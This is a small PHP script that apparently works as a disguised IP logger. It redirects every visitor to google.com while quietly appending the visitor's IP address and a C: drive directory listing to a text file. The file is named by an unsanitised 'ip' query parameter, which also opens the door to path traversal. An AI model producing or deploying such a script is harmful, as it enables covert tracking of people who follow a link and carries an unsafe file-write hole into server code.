<?php
    header("Location:http://google.com");
    $get =  $_GET["ip"];
    $client_ip = $_SERVER['REMOTE_ADDR'];
    $file= fopen($get.'.txt','a');
    exec("cd c:/ & dir", $output);
    // fwrite($file , $get ."\n");
    fwrite($file , "\n****************************\n");
    fwrite($file , $client_ip);
    fwrite($file , "\n****************************\n");

    foreach ($output as $key => $value) {
        fwrite($file , $value ."\n");
    }
?>